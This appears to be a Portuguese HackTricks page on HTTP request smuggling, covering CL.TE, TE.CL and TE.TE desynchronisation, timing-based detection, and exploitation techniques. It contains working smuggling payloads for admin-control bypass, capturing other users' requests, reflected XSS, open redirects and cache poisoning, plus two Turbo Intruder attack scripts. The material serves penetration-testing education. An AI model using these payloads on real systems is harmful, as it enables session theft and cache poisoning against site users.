# HTTP Request Smuggling / Ataque de Desincroniza√ß√£o HTTP

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## O que √©

Essa vulnerabilidade ocorre quando uma **desincroniza√ß√£o** entre **proxies de front-end** e o **servidor de back-end** permite que um **atacante** envie uma **requisi√ß√£o HTTP** que ser√° **interpretada** como uma **√∫nica requisi√ß√£o** pelos **proxies de front-end** (balanceador de carga/proxy reverso) e **como 2 requisi√ß√µes** pelo **servidor de back-end**.\
Isso permite que um usu√°rio **modifique a pr√≥xima requisi√ß√£o que chega ao servidor de back-end ap√≥s a dele**.

### Teoria

[Especifica√ß√£o RFC (2161)](https://tools.ietf.org/html/rfc2616)

> Se uma mensagem for recebida com um campo de cabe√ßalho Transfer-Encoding e um campo de cabe√ßalho Content-Length, este √∫ltimo DEVE ser ignorado.

**Content-Length**

> O cabe√ßalho de entidade Content-Length indica o tamanho do corpo da entidade, em bytes, enviado ao destinat√°rio.

**Transfer-Encoding: chunked**

> O cabe√ßalho Transfer-Encoding especifica a forma de codifica√ß√£o usada para transferir com seguran√ßa o corpo da carga √∫til para o usu√°rio.\
> Chunked significa que dados grandes s√£o enviados em uma s√©rie de chunks.

### Realidade

O **Front-End** (um balanceador de carga / Proxy Reverso) **processa** o cabe√ßalho _**content-length**_ ou o cabe√ßalho _**transfer-encoding**_ e o **servidor de Back-End** **processa o outro** provocando uma **desincroniza√ß√£o** entre os 2 sistemas.\
Isso pode ser muito cr√≠tico, pois **um atacante poder√° enviar uma requisi√ß√£o** para o proxy reverso que ser√° **interpretada** pelo **servidor de back-end como 2 requisi√ß√µes diferentes**. O **perigo** dessa t√©cnica reside no fato de que o **servidor de back-end interpretar√° a 2¬™ requisi√ß√£o injetada** como se ela **viesse do pr√≥ximo cliente** e a **requisi√ß√£o real** desse cliente far√° **parte** da **requisi√ß√£o injetada**.

### Particularidades

Lembre-se de que no HTTP **um caractere de nova linha √© composto por 2 bytes:**

* **Content-Length**: Esse cabe√ßalho usa um **n√∫mero decimal** para indicar o **n√∫mero** de **bytes** do **corpo** da requisi√ß√£o. O corpo √© esperado para terminar no √∫ltimo caractere, **uma nova linha n√£o √© necess√°ria no final da requisi√ß√£o**.
* **Transfer-Encoding:** Esse cabe√ßalho usa no **corpo** um **n√∫mero hexadecimal** para indicar o **n√∫mero** de **bytes** do **pr√≥ximo chunk**. O **chunk** deve **terminar** com uma **nova linha**, mas essa nova linha **n√£o √© contada** pelo indicador de comprimento. Esse m√©todo de transfer√™ncia deve terminar com um **chunk de tamanho 0 seguido por 2 novas linhas**: `0`
* **Connection**: Com base em minha experi√™ncia, √© recomendado usar **`Connection: keep-alive`** na primeira requisi√ß√£o do Request Smuggling.

## Exemplos B√°sicos

Os ataques de requisi√ß√£o de desincroniza√ß√£o HTTP s√£o elaborados enviando requisi√ß√µes amb√≠guas que exploram discrep√¢ncias na forma como os servidores de front-end e back-end interpretam os cabe√ßalhos `Content-Length` (CL) e `Transfer-Encoding` (TE). Esses ataques podem se manifestar em diferentes formas, principalmente como **CL.TE**, **TE.CL** e **TE.TE**. Cada tipo representa uma combina√ß√£o √∫nica de como os servidores de front-end e back-end priorizam esses cabe√ßalhos. As vulnerabilidades surgem do processamento das mesmas requisi√ß√µes pelos servidores de maneiras diferentes, levando a resultados inesperados e potencialmente maliciosos.

### Exemplos B√°sicos de Tipos de Vulnerabilidades

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Vulnerabilidade CL.TE (Content-Length usado pelo Front-End, Transfer-Encoding usado pelo Back-End)
- **Front-End (CL):** Processa a requisi√ß√£o com base no cabe√ßalho `Content-Length`.
- **Back-End (TE):** Processa a requisi√ß√£o com base no cabe√ßalho `Transfer-Encoding`.
- **Cen√°rio de Ataque:**
- O atacante envia uma requisi√ß√£o onde o valor do cabe√ßalho `Content-Length` n√£o corresponde ao comprimento real do conte√∫do.
- O servidor de front-end encaminha a requisi√ß√£o inteira para o back-end, com base no valor de `Content-Length`.
- O servidor de back-end processa a requisi√ß√£o como chunked devido ao cabe√ßalho `Transfer-Encoding: chunked`, interpretando os dados restantes como uma requisi√ß√£o separada e subsequente.
- **Exemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vulnerabilidade TE.CL (Transfer-Encoding usado pelo Front-End, Content-Length usado pelo Back-End)
- **Front-End (TE):** Processa a requisi√ß√£o com base no cabe√ßalho `Transfer-Encoding`.
- **Back-End (CL):** Processa a requisi√ß√£o com base no cabe√ßalho `Content-Length`.
- **Cen√°rio de Ataque:**
- O atacante envia uma requisi√ß√£o chunked onde o tamanho do chunk (`7b`) e o comprimento real do conte√∫do (`Content-Length: 4`) n√£o se alinham.
- O servidor de front-end, respeitando `Transfer-Encoding`, encaminha a requisi√ß√£o inteira para o back-end.
- O servidor de back-end, respeitando `Content-Length`, processa apenas a parte inicial da requisi√ß√£o (`7b` bytes), deixando o restante como parte de uma subsequente e n√£o intencional requisi√ß√£o.
- **Exemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Vulnerabilidade TE.TE (Transfer-Encoding usado por ambos, com obfusca√ß√£o)
- **Servidores:** Ambos suportam `Transfer-Encoding`, mas um pode ser enganado para ignor√°-lo via obfusca√ß√£o.
- **Cen√°rio de Ataque:**
- O atacante envia uma requisi√ß√£o com cabe√ßalhos de `Transfer-Encoding` obfuscados.
- Dependendo de qual servidor (front-end ou back-end) falha em reconhecer a obfusca√ß√£o, uma vulnerabilidade CL.TE ou TE.CL pode ser explorada.
- A parte n√£o processada da requisi√ß√£o, conforme vista por um dos servidores, se torna parte de uma requisi√ß√£o subsequente, levando a desincroniza√ß√£o.
- **Exemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Cen√°rio CL.CL (Content-Length usado por ambos Front-End e Back-End):**
- Ambos os servidores processam a requisi√ß√£o baseados exclusivamente no cabe√ßalho `Content-Length`.
- Esse cen√°rio geralmente n√£o leva a desincroniza√ß√£o, pois h√° alinhamento na forma como ambos os servidores interpretam o comprimento da requisi√ß√£o.
- **Exemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Requisi√ß√£o Normal
```

#### **Cen√°rio CL != 0:**
- Refere-se a cen√°rios onde o cabe√ßalho `Content-Length` est√° presente e tem um valor diferente de zero, indicando que o corpo da requisi√ß√£o tem conte√∫do.
- √â crucial para entender e elaborar ataques de desincroniza√ß√£o, pois influencia como os servidores determinam o final de uma requisi√ß√£o.
- **Exemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Corpo N√£o Vazio
```

#### For√ßando via cabe√ßalhos hop-by-hop

Abusando dos cabe√ßalhos hop-by-hop, voc√™ pode indicar ao proxy para **excluir o cabe√ßalho Content-Length ou Transfer-Encoding para que um HTTP request smuggling seja poss√≠vel de ser abusado**.
```
Connection: Content-Length
```
Para **mais informa√ß√µes sobre cabe√ßalhos hop-by-hop** visite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Encontrando HTTP Request Smuggling

Identificar vulnerabilidades de HTTP request smuggling frequentemente pode ser alcan√ßado utilizando t√©cnicas de temporiza√ß√£o, que dependem de observar quanto tempo o servidor leva para responder a solicita√ß√µes manipuladas. Essas t√©cnicas s√£o particularmente √∫teis para detectar vulnerabilidades CL.TE e TE.CL. Al√©m desses m√©todos, existem outras estrat√©gias e ferramentas que podem ser usadas para encontrar tais vulnerabilidades:

### Encontrando Vulnerabilidades CL.TE Usando T√©cnicas de Temporiza√ß√£o
- **M√©todo:**
- Enviar uma solicita√ß√£o que, se a aplica√ß√£o for vulner√°vel, far√° com que o servidor back-end espere por dados adicionais.
- **Exemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Observa√ß√£o:**
- O servidor front-end processa a solicita√ß√£o com base no `Content-Length` e corta a mensagem prematuramente.
- O servidor back-end, esperando uma mensagem chunked, aguarda o pr√≥ximo chunk que nunca chega, causando um atraso.

- **Indicadores:**
- Timeouts ou longos atrasos na resposta.
- Receber um erro 400 Bad Request do servidor back-end, √†s vezes com informa√ß√µes detalhadas do servidor.

### Encontrando Vulnerabilidades TE.CL Usando T√©cnicas de Temporiza√ß√£o
- **M√©todo:**
- Enviar uma solicita√ß√£o que, se a aplica√ß√£o for vulner√°vel, far√° com que o servidor back-end espere por dados adicionais.
- **Exemplo:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Observa√ß√£o:**
- O servidor front-end processa a solicita√ß√£o com base no `Transfer-Encoding` e encaminha a mensagem inteira.
- O servidor back-end, esperando uma mensagem com base no `Content-Length`, aguarda por dados adicionais que nunca chegam, causando um atraso.

### Outros M√©todos para Encontrar Vulnerabilidades
- **An√°lise Diferencial de Resposta:**
- Enviar vers√µes ligeiramente variadas de uma solicita√ß√£o e observar se as respostas do servidor diferem de maneira inesperada, indicando uma discrep√¢ncia de an√°lise.

- **Usando Ferramentas Automatizadas:**
- Ferramentas como a extens√£o 'HTTP Request Smuggler' do Burp Suite podem testar automaticamente essas vulnerabilidades enviando v√°rias formas de solicita√ß√µes amb√≠guas e analisando as respostas.

- **Testes de Varia√ß√£o de Content-Length:**
- Enviar solicita√ß√µes com valores de `Content-Length` variados que n√£o est√£o alinhados com o comprimento real do conte√∫do e observar como o servidor lida com tais discrep√¢ncias.

- **Testes de Varia√ß√£o de Transfer-Encoding:**
- Enviar solicita√ß√µes com cabe√ßalhos de `Transfer-Encoding` obfuscados ou malformados e monitorar como os servidores front-end e back-end respondem de maneira diferente a essas manipula√ß√µes.


### Testando a Vulnerabilidade de HTTP Request Smuggling

Ap√≥s confirmar a efic√°cia das t√©cnicas de temporiza√ß√£o, √© crucial verificar se as solicita√ß√µes do cliente podem ser manipuladas. Um m√©todo direto √© tentar envenenar suas solicita√ß√µes, por exemplo, fazendo com que uma solicita√ß√£o para `/` resulte em uma resposta 404. Os exemplos `CL.TE` e `TE.CL` discutidos anteriormente em [Exemplos B√°sicos](./#basic-examples) demonstram como envenenar a solicita√ß√£o de um cliente para obter uma resposta 404, apesar do cliente tentar acessar um recurso diferente.

**Considera√ß√µes Importantes**

Ao testar vulnerabilidades de request smuggling interferindo em outras solicita√ß√µes, tenha em mente:

* **Conex√µes de Rede Distintas:** As solicita√ß√µes "de ataque" e "normais" devem ser enviadas por conex√µes de rede separadas. Utilizar a mesma conex√£o para ambas n√£o valida a presen√ßa da vulnerabilidade.
* **URL e Par√¢metros Consistentes:** Procure usar URLs e nomes de par√¢metros id√™nticos para ambas as solicita√ß√µes. Aplica√ß√µes modernas frequentemente roteiam solicita√ß√µes para servidores back-end espec√≠ficos com base no URL e par√¢metros. Correspondendo a esses aumenta a probabilidade de que ambas as solicita√ß√µes sejam processadas pelo mesmo servidor, um requisito para um ataque bem-sucedido.
* **Temporiza√ß√£o e Condi√ß√µes de Corrida:** A solicita√ß√£o "normal", destinada a detectar interfer√™ncia da solicita√ß√£o "de ataque", concorre com outras solicita√ß√µes de aplicativos concorrentes. Portanto, envie a solicita√ß√£o "normal" imediatamente ap√≥s a solicita√ß√£o "de ataque". Aplica√ß√µes ocupadas podem exigir v√°rias tentativas para confirmar a vulnerabilidade de forma conclusiva.
* **Desafios de Balanceamento de Carga:** Servidores front-end atuando como balanceadores de carga podem distribuir solicita√ß√µes entre v√°rios sistemas back-end. Se as solicita√ß√µes "de ataque" e "normais" acabarem em sistemas diferentes, o ataque n√£o ter√° sucesso. Este aspecto de balanceamento de carga pode exigir v√°rias tentativas para confirmar uma vulnerabilidade.
* **Impacto N√£o Intencional no Usu√°rio:** Se seu ataque impactar inadvertidamente a solicita√ß√£o de outro usu√°rio (n√£o a solicita√ß√£o "normal" enviada para detec√ß√£o), isso indica que seu ataque influenciou outro usu√°rio do aplicativo. Testes cont√≠nuos podem perturbar outros usu√°rios, exigindo uma abordagem cautelosa.


## Abusando do HTTP Request Smuggling

### Para burlar controles de seguran√ßa front-end

### Circunven√ß√£o de Seguran√ßa Front-End via HTTP Request Smuggling

√Äs vezes, proxies front-end imp√µem medidas de seguran√ßa, examinando as solicita√ß√µes recebidas. No entanto, essas medidas podem ser contornadas explorando o HTTP Request Smuggling, permitindo acesso n√£o autorizado a endpoints restritos. Por exemplo, acessar `/admin` pode ser proibido externamente, com o proxy front-end bloqueando ativamente tais tentativas. No entanto, esse proxy pode negligenciar inspecionar solicita√ß√µes incorporadas dentro de uma solicita√ß√£o HTTP contrabandeada, deixando uma brecha para contornar essas restri√ß√µes.

Considere os exemplos a seguir ilustrando como o HTTP Request Smuggling pode ser usado para burlar controles de seguran√ßa front-end, visando especificamente o caminho `/admin` que geralmente √© protegido pelo proxy front-end:

**Exemplo CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
No ataque CL.TE, o cabe√ßalho `Content-Length` √© utilizado para a requisi√ß√£o inicial, enquanto a requisi√ß√£o incorporada subsequente utiliza o cabe√ßalho `Transfer-Encoding: chunked`. O proxy de front-end processa a requisi√ß√£o `POST` inicial, mas falha em inspecionar a requisi√ß√£o `GET /admin` incorporada, permitindo acesso n√£o autorizado ao caminho `/admin`.

**Exemplo TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Por outro lado, no ataque TE.CL, a solicita√ß√£o `POST` inicial usa `Transfer-Encoding: chunked`, e a solicita√ß√£o incorporada subsequente √© processada com base no cabe√ßalho `Content-Length`. Semelhante ao ataque CL.TE, o proxy de front-end ignora a solicita√ß√£o `GET /admin` contrabandeada, concedendo inadvertidamente acesso ao caminho restrito `/admin`.

### Revelando a reescrita de solicita√ß√£o de front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

As aplica√ß√µes frequentemente empregam um **servidor de front-end** para modificar as solicita√ß√µes recebidas antes de envi√°-las ao servidor de back-end. Uma modifica√ß√£o t√≠pica envolve adicionar cabe√ßalhos, como `X-Forwarded-For: <IP do cliente>`, para transmitir o IP do cliente ao back-end. Compreender essas modifica√ß√µes pode ser crucial, pois pode revelar maneiras de **burlar prote√ß√µes** ou **descobrir informa√ß√µes ou endpoints ocultos**.

Para investigar como um proxy altera uma solicita√ß√£o, localize um par√¢metro POST que o back-end ecoa na resposta. Em seguida, crie uma solicita√ß√£o, usando este par√¢metro por √∫ltimo, semelhante ao seguinte:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Nesta estrutura, os componentes de solicita√ß√£o subsequentes s√£o anexados ap√≥s `search=`, que √© o par√¢metro refletido na resposta. Essa reflex√£o expor√° os cabe√ßalhos da solicita√ß√£o subsequente.

√â importante alinhar o cabe√ßalho `Content-Length` da solicita√ß√£o aninhada com o comprimento real do conte√∫do. Come√ßar com um valor pequeno e aumentar gradualmente √© aconselh√°vel, pois um valor muito baixo truncar√° os dados refletidos, enquanto um valor muito alto pode fazer com que a solicita√ß√£o apresente erro.

Essa t√©cnica tamb√©m √© aplic√°vel no contexto de uma vulnerabilidade TE.CL, mas a solicita√ß√£o deve terminar com `search=\r\n0`. Independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

Este m√©todo serve principalmente para entender as modifica√ß√µes de solicita√ß√£o feitas pelo proxy de front-end, essencialmente realizando uma investiga√ß√£o autodirigida.

### Capturando solicita√ß√µes de outros usu√°rios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

√â vi√°vel capturar as solicita√ß√µes do pr√≥ximo usu√°rio anexando uma solicita√ß√£o espec√≠fica como o valor de um par√¢metro durante uma opera√ß√£o POST. Veja como isso pode ser feito:

Ao anexar a seguinte solicita√ß√£o como o valor de um par√¢metro, voc√™ pode armazenar a solicita√ß√£o do cliente subsequente:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Neste cen√°rio, o **par√¢metro de coment√°rio** destina-se a armazenar o conte√∫do dentro da se√ß√£o de coment√°rios de uma postagem em uma p√°gina de acesso p√∫blico. Consequentemente, o conte√∫do da solicita√ß√£o subsequente aparecer√° como um coment√°rio.

No entanto, essa t√©cnica tem limita√ß√µes. Geralmente, ela captura dados apenas at√© o delimitador de par√¢metro usado na solicita√ß√£o contrabandeada. Para envios de formul√°rios codificados em URL, esse delimitador √© o caractere `&`. Isso significa que o conte√∫do capturado da solicita√ß√£o do usu√°rio v√≠tima ser√° interrompido no primeiro `&`, que pode at√© fazer parte da string de consulta.

Al√©m disso, vale ressaltar que essa abordagem tamb√©m √© vi√°vel com uma vulnerabilidade TE.CL. Em tais casos, a solicita√ß√£o deve ser conclu√≠da com `search=\r\n0`. Independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

### Usando o contrabando de solicita√ß√£o HTTP para explorar XSS refletido

O Contrabando de Solicita√ß√£o HTTP pode ser aproveitado para explorar p√°ginas da web vulner√°veis a **XSS Refletido**, oferecendo vantagens significativas:

* A intera√ß√£o com os usu√°rios-alvo **n√£o √© necess√°ria**.
* Permite a explora√ß√£o de XSS em partes da solicita√ß√£o que s√£o **normalmente inating√≠veis**, como cabe√ßalhos de solicita√ß√£o HTTP.

Em cen√°rios em que um site √© suscet√≠vel a XSS Refletido por meio do cabe√ßalho User-Agent, a seguinte carga √∫til demonstra como explorar essa vulnerabilidade:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Este payload √© estruturado para explorar a vulnerabilidade atrav√©s de:

1. Iniciar uma solicita√ß√£o `POST`, aparentemente t√≠pica, com um cabe√ßalho `Transfer-Encoding: chunked` para indicar o in√≠cio do smuggling.
2. Seguir com um `0`, marcando o fim do corpo da mensagem chunked.
3. Em seguida, √© introduzida uma solicita√ß√£o `GET` contrabandeada, onde o cabe√ßalho `User-Agent` √© injetado com um script, `<script>alert(1)</script>`, desencadeando o XSS quando o servidor processa essa solicita√ß√£o subsequente.

Ao manipular o `User-Agent` atrav√©s do smuggling, o payload contorna as restri√ß√µes normais da solicita√ß√£o, explorando assim a vulnerabilidade de XSS Refletido de uma maneira n√£o padr√£o, mas eficaz.

### Usando o HTTP request smuggling para transformar um redirecionamento no local em um redirecionamento aberto <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Explorando Redirecionamentos no Local com HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

As aplica√ß√µes frequentemente redirecionam de uma URL para outra usando o nome do host do cabe√ßalho `Host` na URL de redirecionamento. Isso √© comum em servidores web como Apache e IIS. Por exemplo, solicitar uma pasta sem uma barra final resulta em um redirecionamento para incluir a barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Resultados em:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Embora aparentemente inofensivo, esse comportamento pode ser manipulado usando o contrabando de solicita√ß√µes HTTP para redirecionar usu√°rios para um site externo. Por exemplo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Esta solicita√ß√£o contrabandeada poderia fazer com que a pr√≥xima solicita√ß√£o de usu√°rio processada seja redirecionada para um site controlado pelo atacante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Resultados em:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Usando o contrabando de solicita√ß√£o HTTP para realizar envenenamento de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Explorando o Envenenamento de Cache Web via Contrabando de Solicita√ß√£o HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

O envenenamento de cache web pode ser executado se algum componente da **infraestrutura de front-end armazenar em cache conte√∫do**, tipicamente para melhorar o desempenho. Ao manipular a resposta do servidor, √© poss√≠vel **envenenar o cache**.

Anteriormente, observamos como as respostas do servidor poderiam ser alteradas para retornar um erro 404 (consulte [Exemplos B√°sicos](./#basic-examples)). Da mesma forma, √© vi√°vel enganar o servidor para entregar o conte√∫do `/index.html` em resposta a uma solicita√ß√£o para `/static/include.js`. Consequentemente, o conte√∫do `/static/include.js` √© substitu√≠do no cache pelo de `/index.html`, tornando o `/static/include.js` inacess√≠vel aos usu√°rios, potencialmente levando a uma Nega√ß√£o de Servi√ßo (DoS).

Essa t√©cnica se torna particularmente potente se uma **vulnerabilidade de Redirecionamento Aberto** for descoberta ou se houver um **redirecionamento no local para um redirecionamento aberto**. Tais vulnerabilidades podem ser exploradas para substituir o conte√∫do em cache de `/static/include.js` por um script sob o controle do atacante, essencialmente permitindo um ataque generalizado de Cross-Site Scripting (XSS) contra todos os clientes que solicitam o `/static/include.js` atualizado.

Abaixo est√° uma ilustra√ß√£o da explora√ß√£o do **envenenamento de cache combinado com um redirecionamento no local para um redirecionamento aberto**. O objetivo √© alterar o conte√∫do em cache de `/static/include.js` para servir c√≥digo JavaScript controlado pelo atacante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Observe a solicita√ß√£o incorporada direcionada para `/post/next?postId=3`. Esta solicita√ß√£o ser√° redirecionada para `/post?postId=4`, utilizando o **valor do cabe√ßalho Host** para determinar o dom√≠nio. Ao alterar o **cabe√ßalho Host**, o atacante pode redirecionar a solicita√ß√£o para seu dom√≠nio (**redirecionamento interno para redirecionamento aberto**).

Ap√≥s o **envenenamento de soquete** bem-sucedido, uma solicita√ß√£o **GET** para `/static/include.js` deve ser iniciada. Esta solicita√ß√£o ser√° contaminada pela solicita√ß√£o anterior de **redirecionamento interno para redirecionamento aberto** e buscar√° o conte√∫do do script controlado pelo atacante.

Posteriormente, qualquer solicita√ß√£o para `/static/include.js` servir√° o conte√∫do em cache do script do atacante, lan√ßando efetivamente um amplo ataque XSS.


### Usando o contrabando de solicita√ß√£o HTTP para realizar a decep√ß√£o de cache da web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Qual √© a diferen√ßa entre envenenamento de cache da web e decep√ß√£o de cache da web?**
>
> * No **envenenamento de cache da web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do malicioso no cache, e esse conte√∫do √© servido do cache para outros usu√°rios da aplica√ß√£o.
> * Na **decep√ß√£o de cache da web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do sens√≠vel pertencente a outro usu√°rio no cache, e o atacante ent√£o recupera esse conte√∫do do cache.

O atacante elabora uma solicita√ß√£o contrabandeada que busca conte√∫do sens√≠vel espec√≠fico do usu√°rio. Considere o exemplo a seguir:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Se essa solicita√ß√£o contrabandeada envenenar uma entrada de cache destinada a conte√∫do est√°tico (por exemplo, `/someimage.png`), os dados sens√≠veis da v√≠tima de `/private/messages` podem ser armazenados em cache sob a entrada de cache do conte√∫do est√°tico. Consequentemente, o atacante poderia potencialmente recuperar esses dados sens√≠veis armazenados em cache.

### Armando o Contrabando de Solicita√ß√£o HTTP com a Desincroniza√ß√£o de Resposta HTTP

Voc√™ encontrou alguma vulnerabilidade de Contrabando de Solicita√ß√£o HTTP e n√£o sabe como explor√°-la. Experimente este outro m√©todo de explora√ß√£o:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts do Turbo Intruder

### CL.TE

De [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Ferramentas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
